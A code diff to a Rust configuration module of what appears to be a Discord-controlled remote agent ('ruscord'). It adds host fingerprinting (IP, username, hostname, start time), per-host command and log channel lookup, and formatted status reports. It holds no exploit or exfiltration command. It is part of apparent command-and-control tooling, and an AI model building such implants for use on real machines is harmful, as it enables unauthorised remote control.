@@ -1,6 +1,10 @@
-use std::hash::{DefaultHasher, Hash, Hasher};
+use std::{
+    fmt::Display,
+    hash::{DefaultHasher, Hash, Hasher},
+};
 
 use poise::serenity_prelude::*;
+use tokio::time::Instant;
 use uuid::Uuid;
 
 use crate::{utils::channel_manager::ChannelManager, RuscordResult};
@@ -13,7 +17,7 @@ pub use config_data::*;
 const UUID: Uuid =
     uuid::Uuid::from_bytes(*include_bytes!(concat!(env!("OUT_DIR"), "/ruscord.uuid")));
 
-#[derive(Debug, Default)]
+#[derive(Debug)]
 pub struct HostDetails {
     /// Unique identifier for this agent instance
     pub id: Uuid,
@@ -23,9 +27,12 @@ pub struct HostDetails {
     pub hostname: String,
     /// Local IP address of the machine running the agent
     pub ip: String,
+    /// Time the agent was initialized
+    pub init_time: Instant,
 }
 
 /// Main configuration structure for the agent
+#[derive(Debug)]
 pub struct AgentConfig {
     /// Miscellaneous runtime information about the agent
     pub host_details: HostDetails,
@@ -51,6 +58,7 @@ impl AgentConfig {
     /// # Returns
     /// * `RuscordResult<Self>` - The initialized agent configuration
     pub async fn load(ctx: &Context) -> RuscordResult<Self> {
+        let init_time = Instant::now();
         let id = UUID;
         let hostname = whoami::fallible::hostname().unwrap_or(String::from("unknown"));
         let ip = local_ip_address::local_ip()
@@ -63,6 +71,7 @@ impl AgentConfig {
             hostname,
             ip,
             username,
+            init_time,
         };
         let hasher = &mut DefaultHasher::new();
         host_details.hash(hasher);
@@ -117,11 +126,53 @@ impl AgentConfig {
     pub fn check(&self, invocation_cid: ChannelId) -> bool {
         self.command_channel_id.id() == invocation_cid || self.log_channel_id.id() == invocation_cid
     }
+
+    /// Gets the channel manager for the given channel ID
+    pub fn get_manager_for_id(&mut self, id: ChannelId) -> Option<&mut ChannelManager> {
+        if self.command_channel_id.id() == id {
+            Some(&mut self.command_channel_id)
+        } else if self.log_channel_id.id() == id {
+            Some(&mut self.log_channel_id)
+        } else if self.category_channel_id.id() == id {
+            Some(&mut self.category_channel_id)
+        } else {
+            None
+        }
+    }
 }
 
+impl Display for HostDetails {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        let duration = self.init_time.elapsed();
+        let init_datetime = chrono::Local::now() - duration;
+
+        write!(
+            f,
+            "\tIP: {}\n\tUsername: {}\n\tHostname: {}\n\tInit time: {}",
+            self.ip,
+            self.username,
+            self.hostname,
+            init_datetime.to_rfc2822()
+        )
+    }
+}
 impl Hash for HostDetails {
     fn hash<H: Hasher>(&self, state: &mut H) {
-        format!("{}@{}", self.username, self.hostname).hash(state);
+        format!("{}/{}@{}", self.username, self.hostname, self.ip).hash(state);
+    }
+}
+
+impl Display for AgentConfig {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        writeln!(f, "Host Details:")?;
+        Display::fmt(&self.host_details, f)?;
+        writeln!(
+            f,
+            "\nCategory channel ID: {}\nCommand channel ID: {}\nLog channel ID: {}",
+            self.category_channel_id.id(),
+            self.command_channel_id.id(),
+            self.log_channel_id.id()
+        )
     }
 }
 
